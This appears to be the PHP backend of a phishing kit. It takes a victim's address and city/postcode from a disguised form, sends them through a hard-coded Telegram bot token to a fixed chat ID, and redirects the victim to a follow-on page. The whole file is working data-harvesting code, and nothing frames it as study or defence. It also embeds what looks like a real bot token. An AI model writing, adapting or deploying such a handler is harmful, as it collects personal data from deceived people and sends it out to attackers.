<?php
// Inclure la bibliothèque Telegram Bot API
require './composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les données du formulaire
    $adoirs = $_POST['adoirs'];
    $vopil = $_POST['vopil'];

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ');

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Informations Adresse:\n\n";
    $message .= "Adresse : $adoirs\n";
    $message .= "Ville et code postal : $vopil\n";

    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '-1002427871420';

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    // Rediriger l'utilisateur vers la page de confirmation
    header("Location: ./adrion.php");
    exit();
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
